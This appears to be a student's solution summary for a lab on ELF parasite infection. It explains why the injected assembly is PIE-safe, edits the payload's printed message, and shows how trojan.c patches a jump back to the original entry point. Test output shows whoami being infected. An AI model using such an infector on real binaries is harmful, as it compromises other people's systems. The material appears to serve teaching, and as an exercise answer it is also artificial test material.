# Solution Summary

## Question 1: What Makes This Code Safe for PIE?

The code is PIE (Position Independent Executable) safe due to **RIP-relative addressing** used in the payload.

### The Critical Line (payload.asm:31)
```asm
lea rsi, [rel message]
```

**Why this is PIE-safe:**
- The `[rel message]` syntax uses RIP-relative addressing
- Instead of an absolute memory address, it calculates: `address = RIP + offset`
- This works regardless of where the code is loaded in memory
- PIE executables can be loaded at different addresses due to ASLR (Address Space Layout Randomization)

**What would NOT be PIE-safe:**
```asm
mov rsi, message  ; Uses absolute address - breaks with PIE
```

For detailed explanation, see [PIE_SAFETY.md](PIE_SAFETY.md)

## Question 2: Change Payload and Return to Regular Execution

### Changes Made

**1. Updated Message (payload.asm:22)**
- Changed from: `"this is the payload speaking"`
- Changed to: `"hello world from payload"`

**2. Updated Message Length (payload.asm:34)**
- Changed from: `mov dl, 0x39` (57 bytes - old message length)
- Changed to: `mov dl, 0x19` (25 bytes - new message length)

### Return to Regular Execution

The payload already returns to regular program execution. This is handled by:

**1. Register Preservation (payload.asm:13-18, 39-44)**
```asm
; Save all registers at start
push rax, rcx, rdx, rsi, rdi, r11

; Restore all registers before returning
pop r11, rdi, rsi, rdx, rcx, rax
```

**2. Jump to Original Entry Point (payload.asm:48)**
```asm
jmp 0x1000  ; Placeholder address, patched by infect_host()
```

The `infect_host()` function in trojan.c (line 130) patches this jump with the correct relative offset to the original program entry point:
```c
offset = ehdr->e_entry - (pos + parasite.size);
*(Elf64_Word*)(parasite.payload + parasite.size - 4) = (Elf64_Word)offset;
```

## Testing Results

All tests passed successfully:

### Test 1: Regular Executable
```
Before: Program executed successfully! (exit code: 42)
After:  hello world from payload
        Program executed successfully! (exit code: 42)
```

### Test 2: PIE Executable
```
Before: Program executed successfully! (exit code: 42)
After:  hello world from payload
        Program executed successfully! (exit code: 42)
```

### Test 3: System Binary (whoami)
```
Before: runner
After:  hello world from payload
        runner
```

## Build Instructions

```bash
make clean
make
./infect -f <target_executable>
```

## Files Modified

1. **payload.asm** - Updated message and length
2. **.gitignore** - Added to exclude build artifacts
3. **PIE_SAFETY.md** - Comprehensive PIE safety documentation (new)
4. **SOLUTION_SUMMARY.md** - This file (new)
